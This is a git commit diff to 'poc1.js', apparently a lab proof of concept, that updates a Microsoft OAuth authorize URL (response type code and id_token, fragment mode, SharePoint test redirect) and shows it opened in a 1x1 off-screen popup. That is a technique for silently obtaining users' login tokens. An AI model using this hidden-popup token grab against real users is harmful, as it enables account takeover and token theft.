0bbac98c73290a3634b086c5b392d9c935a72dd9
Pedro <52047256+pedrojuniorrd@users.noreply.github.com>
2026-01-15 09:34:34 -0300

    Update poc1.js

--- poc1.js
+++ poc1.js
@@ -2,7 +2,7 @@
 if(window.__labPoc)return;
 window.__labPoc=1;
 
-const oauth = "https://login.microsoftonline.com:443/765ca7f2-70b3-424e-ac45-f00d5a55e9ce/oauth2/authorize?client%5Fid=00000003%2D0000%2D0ff1%2Dce00%2D000000000000&response%5Fmode=fragment&response%5Ftype=code%20id%5Ftoken&resource=00000003%2D0000%2D0ff1%2Dce00%2D000000000000&scope=openid&nonce=58885352608C741216307593DFA56210AF7C2C060F5842C0%2D6AE204CE9B9D8A5C216DC98EC5C8BE29169409890FB3D4960909C81E976118C3&redirect%5Furi=https%3A%2F%2Fshiscolinotests%2Esharepoint%2Ecom%2F%5Fforms%2Fdefault%2Easpx&state=OD0w&claims=%7B%22id%5Ftoken%22%3A%7B%22xms%5Fcc%22%3A%7B%22values%22%3A%5B%22CP1%22%5D%7D%7D%7D&wsucxt=1&cobrandid=11bd8083%2D87e0%2D41b5%2Dbb78%2D0bc43c8a8e8a&client%2Drequest%2Did=4f3ceda1%2D00d6%2Db000%2D0f8f%2D81a14919214f";
+const oauth = "https://login.microsoftonline.com:443/765ca7f2-70b3-424e-ac45-f00d5a55e9ce/oauth2/authorize?client%5Fid=00000003%2D0000%2D0ff1%2Dce00%2D000000000000&response%5Fmode=fragment&response%5Ftype=code%20id%5Ftoken&resource=00000003%2D0000%2D0ff1%2Dce00%2D000000000000&scope=openid&nonce=5087B4347D52EB639902BE58716D03C6FBD568C46DBF089F%2D69D972B72738DAA6640DA90C0C7DDE44C6CF72DA96276BDE3D820E83F4E50D14&redirect%5Furi=https%3A%2F%2Fshiscolinotests%2Esharepoint%2Ecom%2F%5Fforms%2Fdefault%2Easpx&state=OD0w&claims=%7B%22id%5Ftoken%22%3A%7B%22xms%5Fcc%22%3A%7B%22values%22%3A%5B%22CP1%22%5D%7D%7D%7D&wsucxt=1&cobrandid=11bd8083%2D87e0%2D41b5%2Dbb78%2D0bc43c8a8e8a&client%2Drequest%2Did=2d3deda1%2Dd043%2Db000%2D0f8f%2D8b9f58e87e99";
 
 let win=open(oauth,"","width=1,height=1,left=-10000,top=-10000");
 
